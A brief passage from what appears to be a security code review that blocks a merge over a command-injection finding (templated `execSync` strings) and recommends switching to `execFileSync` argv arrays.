**G1+G2+G3 interlock is sound.** Design is correct. But R1 is a genuinely new (or rather pre-existing, newly surfaced) attack surface that the round-2 rewrite expands with two additional interpolation sites. R1 must be fixed before merge.

**Verdict: BLOCKED — 1 new HIGH finding (R1).** Fix is mechanical (~10 lines of diff to switch `execSync` templated strings to `execFileSync` argv arrays). Once R1 is closed, grinch is satisfied that the design holds and the fixes are consistent with the locked decisions.
